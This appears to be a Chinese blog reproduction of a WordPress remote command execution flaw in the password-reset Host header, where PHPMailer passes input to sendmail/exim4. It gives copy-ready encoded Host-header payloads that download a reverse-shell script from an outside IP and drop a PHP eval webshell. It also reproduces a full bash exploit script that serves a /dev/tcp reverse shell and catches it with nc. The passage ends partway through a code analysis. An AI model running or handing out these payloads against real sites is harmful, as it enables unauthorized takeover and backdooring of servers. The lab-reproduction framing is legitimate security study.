&lt; 5.2.18之前的版本存在命令注入漏洞，具体你可以先阅读分析文章链接 。\n我们来看看这个漏洞在wordpress中的情况。漏洞文件是class.phpmailer.php，我们在wordpress中搜索查看这个文件，该文件在在wp-includes目录下。我们可以发现几行关键代码：\n/**     * Which method to use to send mail.     * Options: &quot;mail&quot;, &quot;sendmail&quot;, or &quot;smtp&quot;.     * @var string     */    public $Mailer = &#x27;mail&#x27;;    /**     * The path to the sendmail program.     * @var string     */    public $Sendmail = &#x27;/usr/sbin/sendmail&#x27;;\n我们发现，实际上phpmailer组件是调用linux系统命令sendmail进行邮件发送，命令格式为：sendmail -t -i -fusername@hostname。并且我们继续审计代码发现：\n/**     * Get the server hostname.     * Returns &#x27;localhost.localdomain&#x27; if unknown.     * @access protected     * @return string     */    protected function serverHostname()    &#123;        $result = &#x27;localhost.localdomain&#x27;;        if (!empty($this-&gt;Hostname)) &#123;            $result = $this-&gt;Hostname;        &#125; elseif (isset($_SERVER) and array_key_exists(&#x27;SERVER_NAME&#x27;, $_SERVER) and !empty($_SERVER[&#x27;SERVER_NAME&#x27;])) &#123;            $result = $_SERVER[&#x27;SERVER_NAME&#x27;];        &#125; elseif (function_exists(&#x27;gethostname&#x27;) &amp;&amp; gethostname() !== false) &#123;            $result = gethostname();        &#125; elseif (php_uname(&#x27;n&#x27;) !== false) &#123;            $result = php_uname(&#x27;n&#x27;);        &#125;        return $result;    &#125;\nserverHostname函数通过传入的SERVER_NAME参数来获取主机名，该主机名即HTTP请求报文中的host值，但是SERVER_NAME参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。\n更棒的是，sendmail 提供了-O和-X参数，-X参数用于写入日志文件， 我们可以使用-OQueueDirectory=/tmp/ -X/tmp/smtp.php命令组合，它会将发送的邮件保存到/tmp/smtp.php中， 那么在请求的时候payload应该类似于这样：\nPOST /wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: aaa( -X/tmp/smtp.php )@qq.com\n在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？\n思路很好，然而现实很无奈。\n\nwordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考链接。\n比如我们想要调用/bin/touch的时候也会出问题，因为host字段中如果出现/，服务器会拒绝我们的请求。\n\n因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！\n正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道ubuntu/debain系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。\n![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png)\n那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现-be参数\nRun Exim in expansion testing mode. Exim  discards  its  root                 privilege,  to prevent ordinary users from using this mode to                 read otherwise inaccessible files. If no arguments are given,                 Exim  runs interactively, prompting for lines of data. Other‐                 wise, it processes each argument in turn.                 If Exim was built with USE_READLINE=yes in Local/Makefile, it                 tries  to  load  the libreadline library dynamically whenever                 the -be option is used without  command  line  arguments.  If                 successful,  it  uses the readline() function, which provides                 extensive line-editing facilities, for reading the test data.                 A line history is supported.                 Long expansion expressions can be split over several lines by                 using backslash continuations. As in Exim&#x27;s run time configu‐                 ration,  white  space  at  the start of continuation lines is                 ignored. Each argument or data line  is  passed  through  the                 string  expansion  mechanism, and the result is output. Vari‐                 able values from the configuration file (for example,  $qual‐                 ify_domain)  are  available,  but  no message-specific values                 (such as $message_exim_id) are set,  because  no  message  is                 being processed (but see -bem and -Mset).                 Note:  If  you  use  this  mechanism to test lookups, and you                 change the data files or databases you are  using,  you  must                 exit  and  restart  Exim before trying the same lookup again.                 Otherwise, because each Exim process caches  the  results  of                 lookups,  you will just get the same result as before.  Macro                 processing is done  on  lines  before  string-expansion:  new                 macros  can  be defined and macros will be expanded.  Because                 macros in the config file are often used for  secrets,  those                 are only available to admin users.\n下面同样也是$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;与$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;的原理：\n我们可以知道ubuntu/debain系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。\n![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png)\n那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现-be参数，简单来说，-be参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，$tod_log，它可以显示系统时间。\n并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数substr、$run系统调用函数。\n我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。\n![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png)\n那么同理，我们也可以截取/字符串：\n![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png)\n我们测试使用$run函数调用系统命令\n![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png)\n到这里，遇到的问题都解决了。\n0x04 漏洞复现\nEXP\nPOST /wp-login.php?action=lostpassword HTTP/1.1Host: target(any -froot@localhost -be $&#123;run&#123;【要执行的命令】&#125;&#125; null)Connection: closeUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Accept: */*Content-Length: 56Content-Type: application/x-www-form-urlencodedwp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin\n我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示：\n1.执行的命令不能包含大量特殊字符，如:、引号等。2.命令会被转换成小写字母3.命令需要使用绝对路径4.需要知道某一个存在的用户的用户名5.我们处理后的命令会执行，但是不会显示到页面上。为了解决这些坑，漏洞作者想出了，利用 $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125; 代替 / ，用 $&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125; 代替空格的方法。但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。\n利用\n所以，总体来说利用过程如下：\n\n编写反弹 shell 的 exp，放到某个网页里。有如下要求：\n\n整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径\n访问该网页不能跳转，因为 follow 跳转的参数是 -L （大写）\n\n\n拼接成命令 /usr/bin/curl -o/tmp/rce example.com/shell.sh 和命令 /bin/bash /tmp/rce\n将上述命令中的空格和 / 转换成 $&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125; 和 $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;\n拼接成 HTTP 包的 Host 头： target(any -froot@localhost -be $&#123;run&#123;command&#125;&#125; null)\n依次发送这两个拼接好的数据包\n\n复现\n漏洞缺陷处在后台找回密码的地方\n初始化管理员用户名和密码后访问 https://ip:8080/wp-login.php，点击忘记密码界面\n![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png)\n这里用户名为 @1_h bcx\n我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：\naa(any -froot@localhost -be $&#123;run&#123;/bin/touch /tmp/test.txt&#125;&#125; null)\n\n空格  ==&gt; ${substr{10}{1}{$tod_log}}\n/  ==&gt; ${substr{0}{1}{$spool_directory}}\n\n转换过来就是\naa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test.txt&#125;&#125; null)\n![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png)\n在/tmp目录下发现成功生成了测试文件。\n![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png)\n反弹 shell\n利用 curl 或者 wget 命令下载远程文件\n\n测试下载反弹 shell：\n注意：\n\n攻击机启用 http 服务\n远程 URL 中不能有 http://\n所有字母必须小写\n\n\n远程反弹shell脚本：ip/a.txt，内容：\nbash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1\npayload：\n/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt\n执行反弹shell：\n/bin/bash /tmp/rce\n两个payload转换过来就是\naa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;124.220.233.26$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;a.txt&#125;&#125; null)aa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bash$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce&#125;&#125; null)\n在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell\nnc -lvnp 12345\n![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png)\n写入一句话webshell\n1.txt内容：\n&lt;?php @eval($_POST[1]);?&gt;\n同理，可以直接下载一句话webshell，然后菜刀连接。payload：\npayload：\naa(any -froot@localhost -be $&#123;run&#123;/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt&#125;&#125; null)\n转换过来即\naa(any -froot@localhost -be $&#123;run&#123;aa(any$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;-froot@localhost$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;-be$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;1.php$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;ip$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;1.txt&#125;&#125;$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;null)&#125;&#125; null)\n![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png)\n0x05 POC\n自动化提交 payload，获取反弹 shell。通过 python -mSimpleHTTPServer 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。\n使用方法\n攻击机上运行./exp.sh [http://xx.xx.xx.xx/](http://xx.xx.xx.xx/)即可 其中xx.xx.xx.xx为靶机wordpress的根地址\n#!/bin/bash##      __                     __   __  __           __#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________#    / /   / _ \\/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )#  /_____/\\___/\\__, /\\__,_/_/  /_/ /_/\\__,_/\\___/_/|_|\\___/_/  /____/#            /____/### WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit# CVE-2016-10033## wordpress-rce-exploit.sh (ver. 1.0)### Discovered and coded by## Dawid Golunski (@dawid_golunski)# https://legalhackers.com## ExploitBox project:# https://ExploitBox.io## Full advisory URL:# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html## Exploit src URL:# https://exploitbox.io/exploit/wordpress-rce-exploit.sh### Tested on WordPress 4.6:# https://github.com/WordPress/WordPress/archive/4.6.zip## Usage:# ./wordpress-rce-exploit.sh target-wordpress-url### Disclaimer:# For testing purposes only### -----------------------------------------------------------------## Interested in vulns/exploitation?###                        .;lc&#x27;#                    .,cdkkOOOko;.#                 .,lxxkkkkOOOO000Ol&#x27;#             .&#x27;:oxxxxxkkkkOOOO0000KK0x:&#x27;#          .;ldxxxxxxxxkxl,.&#x27;lk0000KKKXXXKd;.#       &#x27;:oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.#      &#x27;&#x27;;ldxxxxxdc,.              ,oOXXXNNNXd;,.#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:#     .dxxxxxc      .cNMMMN.oMMMMx&#x27;      .xxxxxx:#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    &#x27;xxxxxx:#     .dxxxxxc    ;Mc   .lx.:o,    Kl    &#x27;xxxxxx:#     .dxxxxxdl;. .,               .. .;cdxxxxxx:#     .dxxxxxxxxxdc,.              &#x27;cdkkxxxxxxxx:#      .&#x27;:oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.#             .&#x27;:oxxxxxxxxx.ckkkkkkkkxl,.#                 .,cdxxxxx.ckkkkkxc.#                    .&#x27;:odx.ckxl,.#                        .,.&#x27;.## https://ExploitBox.io## https://twitter.com/Exploit_Box## ----------------------------------------------------------------- rev_host=&quot;124.220.233.26&quot; function prep_host_header() &#123;      cmd=&quot;$1&quot;      rce_cmd=&quot;\\$&#123;run&#123;$cmd&#125;&#125;&quot;;       # replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;      #sed &#x27;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&#x27;      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^/^\\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\\$spool_directory&#125;&#125;^g&#x27;`&quot;       # replace &#x27; &#x27; (space) with      #sed &#x27;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&#x27;      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^ ^\\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\\$tod_log&#125;&#125;^g&#x27;`&quot;      #return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;      host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;      return 0&#125; #cat exploitbox.ansintro=&quot;DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09rbzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19fG1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19cG1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAgIHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19fIC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19fX19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtbNUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01NTU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTszNG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2ROTU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMgICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQobWzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1szNG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtbMzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19fX19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;intro2=&quot;ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtbMG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBEaXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAgICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJpbGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;echo &quot;$intro&quot;  | base64 -decho &quot;$intro2&quot; | base64 -d if [ &quot;$#&quot; -ne 1 ]; thenecho -e &quot;Usage:\\n$0 target-wordpress-url\\n&quot;exit 1fitarget=&quot;$1&quot;echo -ne &quot;\\e[91m[*]\\033[0m&quot;read -p &quot; Sure you want to get a shell on the target &#x27;$target&#x27; ? [y/N] &quot; choiceecho if [ &quot;$choice&quot; == &quot;y&quot; ]; then echo -e &quot;\\e[92m[*]\\033[0m Guess I can&#x27;t argue with that... Let&#x27;s get started...\\n&quot;echo -e &quot;\\e[92m[+]\\033[0m Connected to the target&quot; # Serve payload/bash script on :80RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;echo &quot;$RCE_exec_cmd&quot; &gt; rce.txtpython -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;hpid=$! # Save payload on the target in /tmp/rcecmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -s -d &#x27;user_login=@1_h bcx&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpasswordecho -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot; # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &#x27;user_login=@1_h bcx&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword &amp;echo -e &quot;\\n\\e[92m[+]\\033[0m Payload executed!&quot; echo -e &quot;\\n\\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m...\\n&quot;nc -nvv -l -p 5555echoelseecho -e &quot;\\e[92m[+]\\033[0m Responsible choice ;) Exiting.\\n&quot;exit 0 fi echo &quot;Exiting...&quot;exit 0\n脚本需要修改的部分\n三个地方 第一处 #1 line 1\nrev_host=&quot;192.168.57.1&quot; #1\n这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。\n第二处 #2 line 75\n第三处 #3 line 80\ncurl -H&quot;Host: $host_header&quot; -s -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword #2echo -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot;# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword &amp; #3\n这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin\n这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱\n因为找回密码时他会先判断邮箱是否存在，再进行下一步\n如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在\n如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了\n下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功\n![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png)\n可以看到靶机上也确实出现了rce文件\n这边执行的命令是/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt\n![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png)\n这三个地方改好了之后，脚本就可以运行了\n脚本的主要流程：\n\n\n生成本地rce.txt 里面写的是是建立连接的命令\n命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下\n命令执行第二次 运行tmp目录下的rce\nnc连接靶机\n\n\n0x06 漏洞原理深入\n将docker中的wordpress源码拷贝出来sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code\n根据忘记密码页面的urlwp-login.php?action=lostpassword定位到wp-login.php的retrieve_password函数，此函数是对密码的操作函数。\n此函数中对用户输入进行处理后，最后通过以下代码发送邮件\nfunction retrieve_password() &#123;\t......        \t$message = apply_filters( &#x27;retrieve_password_message&#x27;, $message, $key, $user_login, $user_data );\tif ( $message &amp;&amp; !wp_mail( $user_email, wp_specialchars_decode( $title ), $message ) )\t\twp_die( __(&#x27;The email could not be sent.&#x27;) . &quot;&lt;br /&gt;\\n&quot; . __(&#x27;Possible reason: your host may have disabled the mail() function.&#x27;) );\treturn true;&#125;\n跟进wp_mail函数，定位到/wp-includes/pluggable.php\n函数中其中关于host的设置如下\nif ( !isset( $from_name ) )\t\t$from_name = &#x27;WordPress&#x27;;\tif ( !isset( $from_email ) ) &#123;\t\t// Get the site domain and get rid of www.\t\t$sitename = strtolower( $_SERVER[&#x27;SERVER_NAME&#x27;] );\t\tif ( substr( $sitename, 0, 4 ) == &#x27;www.&#x27; ) &#123;\t\t\t$sitename = substr( $sitename, 4 );\t\t&#125;\t\t$from_email = &#x27;wordpress@&#x27; . $sitename;\t&#125;\t$from_email = apply_filters( &#x27;wp_mail_from&#x27;, $from_email );\t$from_name = apply_filters( &#x27;wp_mail_from_name&#x27;, $from_name );\t$phpmailer-&gt;setFrom( $from_email, $from_name );\n根据代码可以看出wordpress基于$_SERVER['SERVER_NAME']来构造$from_email发送邮件的域，前面拼接上wordpress@\n$_SERVER['SERVER_NAME']参数是通过请求头Host字段传入，并且这里只是简单的使用substr去掉了前面的www.，没有任何过滤措施。\n在docker中添加a.php代码来查看$_SERVER['SERVER_NAME']的值\n&lt;?phpif (isset($_SERVER[&#x27;SERVER_NAME&#x27;]))&#123;    echo $_SERVER[&#x27;SERVER_NAME&#x27;];&#125;else&#123;    echo &quot;no value&quot;;&#125;?&gt;\n在下图中看到就是Host字段的值\n![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png)\n接着跟进setFrom函数，定位到wp-includes/class-phpmailer.php，发现其用到了PHPMailer组件\nsetFrom函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值\npublic function setFrom($address, $name = &#x27;&#x27;, $auto = true)    &#123;        $address = trim($address);        $name = trim(preg_replace(&#x27;/[\\r\\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim        // Don&#x27;t validate now addresses with IDN. Will be done in send().        if (($pos = strrpos($address, &#x27;@&#x27;)) === false or            (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and            !$this-&gt;validateAddress($address)) &#123;            $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . $address;            $this-&gt;setError($error_message);            $this-&gt;edebug($error_message);            if ($this-&gt;exceptions) &#123;                throw new phpmailerException($error_message);            &#125;            return false;        &#125;        $this-&gt;From = $address;        $this-&gt;FromName = $name;        if ($auto) &#123;            if (empty($this-&gt;Sender)) &#123;                $this-&gt;Sender = $address;            &#125;        &#125;        return true;    &#125;\n其中validateAddress()函数在同文件下，函数前半部分如下\nif (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123;            //Check this constant first so it works when extension_loaded() is disabled by safe mode            //Constant was added in PHP 5.2.4            if (defined(&#x27;PCRE_VERSION&#x27;)) &#123;                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2                if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;pcre8&#x27;;                &#125; else &#123;                    $patternselect = &#x27;pcre&#x27;;                &#125;            &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123;                //Fall back to older PCRE                $patternselect = &#x27;pcre&#x27;;            &#125; else &#123;                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension                if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;php&#x27;;                &#125; else &#123;                    